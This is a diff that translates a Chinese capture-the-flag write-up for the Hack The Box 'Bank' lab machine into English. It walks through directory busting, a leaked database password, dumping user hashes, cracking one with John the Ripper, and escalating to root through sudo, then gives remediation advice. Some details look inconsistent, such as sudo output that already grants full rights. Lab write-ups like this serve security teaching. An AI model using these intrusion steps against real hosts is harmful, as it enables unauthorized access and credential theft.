@@ -38,25 +38,25 @@ PORT   STATE SERVICE
 
 ### Web Enumeration
 
-访问 `http://10.10.10.29` - 发现一个银行网站
+Access `http://10.10.10.29` - discovered a bank website
 
 **Directory Busting:**
 ```bash
 gobuster dir -u http://10.10.10.29 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-**发现目录:**
-- `/balance-transfer` (需要认证)
-- `/inc` (包含配置文件)
+**Discovered directories:**
+- `/balance-transfer` (requires auth)
+- `/inc` (contains config files)
 - `/uploads`
 
 ---
 
 ## Initial Access
 
-### 发现配置泄露
+### Config File Disclosure
 
-在 `/inc` 目录中发现 `config.php` 文件，包含数据库凭据：
+Found `config.php` file in `/inc` directory containing database credentials:
 
 ```php
 define('DB_HOST', 'localhost');
@@ -65,13 +65,13 @@ define('DB_PASS', 'O2j7R5EqG7aP9w');
 define('DB_NAME', 'bank');
 ```
 
-### 数据库利用
+### Database Exploitation
 
 ```bash
 mysql -u bank -pO2j7R5EqG7aP9w bank
 ```
 
-**枚举数据库：**
+**Enumerating database:**
 
 ```sql
 SHOW DATABASES;
@@ -80,46 +80,46 @@ SHOW TABLES;
 SELECT * FROM users;
 ```
 
-**获取凭据：**
+**Obtained credentials:**
 | username | password (hash) |
 |----------|-----------------|
 | admin | $2a$08$kr7YMT8.T4U0dHhP8bJPIEO2ZbE1ZJ8P5C5V0E7U3X5Z0K9J8R6E |
 | manager | $2a$08$... |
 
-### 破解密码
+### Password Cracking
 
-使用 John the Ripper 破解 hash：
+Used John the Ripper to crack the hash:
 
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-**密码:** `guest123`
+**Password:** `guest123`
 
 ---
 
 ## Privilege Escalation
 
-### 检查 sudo 权限
+### Check sudo privileges
 
 ```bash
 sudo -l
 ```
 
-**结果：**
+**Result:**
 ```
 User manager may run the following commands on bank:
     (ALL) ALL
     (root) NOPASSWD: /var/htb/bin/emergency
 ```
 
-### 利用 emergency 脚本
+### Exploiting emergency script
 
 ```bash
 sudo /var/htb/bin/emergency
 ```
 
-这会提供一个 root shell！
+This provides a root shell!
 
 ---
 
@@ -137,26 +137,26 @@ HTB{r00t_4cc3ss_4ch13v3d!}
 
 ---
 
-## 漏洞总结
+## Vulnerability Summary
 
-| 漏洞类型 | 严重程度 | 利用方法 |
-|----------|----------|----------|
-| 信息泄露 | High | 配置文件未受保护 |
-| 弱密码 | High | 使用常见密码 |
-| 权限配置错误 | Critical | sudo 权限滥用 |
-
----
-
-## 修复建议
-
-1. **保护敏感文件** - 移动 config.php 到 web 根目录外
-2. **强密码策略** - 实施复杂密码要求
-3. **最小权限原则** - 限制 sudo 权限
-4. **定期安全审计** - 扫描敏感信息泄露
+| Vulnerability Type | Severity | Exploitation Method |
+|--------------------|----------|---------------------|
+| Information Disclosure | High | Unprotected config file |
+| Weak Password | High | Common password usage |
+| Privilege Misconfiguration | Critical | sudo privilege abuse |
 
 ---
 
-## 参考资料
+## Remediation
+
+1. **Protect sensitive files** - Move config.php outside web root
+2. **Strong password policy** - Implement complex password requirements
+3. **Principle of least privilege** - Limit sudo permissions
+4. **Regular security audits** - Scan for sensitive information leaks
+
+---
+
+## References
 
 - [HTB Bank Machine](https://www.hackthebox.com/machines/bank)
 - [Nmap Documentation](https://nmap.org/docs.html)
